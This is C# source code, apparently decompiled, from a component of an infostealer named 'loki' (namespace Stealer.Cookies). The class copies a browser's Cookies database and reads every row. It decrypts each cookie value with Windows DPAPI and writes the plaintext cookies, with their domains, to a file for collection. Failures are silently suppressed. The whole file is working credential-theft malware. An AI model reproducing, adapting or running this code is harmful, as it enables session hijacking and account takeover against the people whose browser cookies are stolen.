using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using loki.sqlite;

namespace loki.loki.Stealer.Cookies;

public class GetCookies
{
	public static int CCookies;

	private static List<string> Cookies = new List<string>();

	public static List<string> domains = new List<string>();

	public static List<string> Cookies_Gecko = new List<string>();

	public static string CreateTempPath()
	{
		return Path.Combine(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId));
	}

	public static string CreateTempCopy(string filePath)
	{
		string text = CreateTempPath();
		File.Copy(filePath, text, overwrite: true);
		return text;
	}

	public static void Cookie_Grab(string profilePath, string browser_name, string profile)
	{
		try
		{
			string filePath = Path.Combine(profilePath, "Cookies");
			CNT cNT = new CNT(CreateTempCopy(filePath));
			cNT.ReadTable("cookies");
			for (int i = 0; i < cNT.RowLength; i++)
			{
				CCookies++;
				try
				{
					Cookies.Add(cNT.ParseValue(i, "host_key").Trim() + "\t" + (cNT.ParseValue(i, "httponly") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "secure") == "1") + "\t" + cNT.ParseValue(i, "expires_utc").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + DecryptBlob(cNT.ParseValue(i, "encrypted_value"), (DataProtectionScope)0).Trim() + Environment.NewLine);
					domains.Add(cNT.ParseValue(i, "host_key").Trim());
				}
				catch (Exception)
				{
				}
			}
			using (StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + profile + "_" + browser_name + "_Cookies.txt"))
			{
				for (int j = 0; j < Cookies.Count(); j++)
				{
					streamWriter.Write(Cookies[j]);
				}
			}
			Cookies.Clear();
		}
		catch
		{
		}
	}

	public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		return DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
	}

	public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (EncryptedData != null && EncryptedData.Length != 0)
			{
				byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
				return Encoding.UTF8.GetString(bytes);
			}
			return string.Empty;
		}
		catch (CryptographicException)
		{
			return string.Empty;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}
}
